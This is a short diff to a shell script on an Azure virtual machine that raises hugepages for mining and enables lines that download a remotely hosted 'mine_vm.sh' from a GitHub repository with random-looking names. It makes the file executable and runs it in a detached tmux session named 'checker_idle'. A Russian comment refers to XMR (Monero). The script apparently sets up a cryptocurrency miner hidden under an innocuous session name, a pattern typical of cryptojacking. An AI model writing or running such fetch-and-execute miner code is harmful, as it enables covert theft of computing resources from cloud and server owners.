@@ -25,10 +25,10 @@ fi
 sudo /usr/sbin/sysctl -w vm.nr_hugepages=480
 
 #### ПОД КУБИР И ХМР СВИТЧ СДЕЛАЛ
-#cd /home/azureuser
-#wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/mine_vm.sh -P /home/azureuser -N
-#chmod +x /home/azureuser/mine_vm.sh
-#tmux kill-session -t checker_idle
+cd /home/azureuser
+wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/mine_vm.sh -P /home/azureuser -N
+chmod +x /home/azureuser/mine_vm.sh
+tmux kill-session -t checker_idle
 tmux new -ds checker_idle /home/azureuser/mine_vm.sh 
 
 #echo TEXT="$((RANDOM % 999999 + 2))" >> /home/azureuser/.bashrc
